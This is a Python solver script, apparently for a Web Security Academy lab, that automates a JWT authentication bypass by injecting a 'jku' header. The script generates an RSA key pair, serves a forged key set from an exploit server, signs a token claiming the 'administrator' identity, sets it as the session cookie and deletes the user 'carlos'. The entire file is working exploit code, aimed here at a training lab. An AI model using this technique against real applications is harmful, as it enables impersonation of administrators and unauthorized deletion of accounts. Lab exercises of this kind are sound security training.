from web_security_academy.core.logger import logger

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jose import jwk, constants

from urllib.parse import urljoin
import json
import jwt


def solve_lab(session):
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    logger.info("Generated asymmetric key pair, including public key PEM")

    json_web_token = jwk.RSAKey(
        algorithm=constants.Algorithms.RS256, key=pem.decode()
    ).to_dict()
    logger.info("Created JWK using public key PEM")

    # Set up exploit server with JWK set
    jwk_set = {"keys": [json_web_token]}
    exploit_server = session.exploit_server()
    headers = ["HTTP/1.1 200 OK", "Content-Type: text/html; charset=utf-8"]
    exploit_server.craft_response("/jwks.json", "\n".join(headers), json.dumps(jwk_set))

    payload = {"sub": "administrator"}
    token = jwt.encode(
        payload,
        private_key,
        algorithm="RS256",
        headers={"jku": urljoin(exploit_server.url, "/jwks.json")},
    )
    logger.info(
        "Encoded the following payload as a JWT (includes JKU header + private key signing):"
    )
    logger.info(payload)

    session.cookies.set("session", token)
    logger.info("Set the session cookie to signed JWT")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
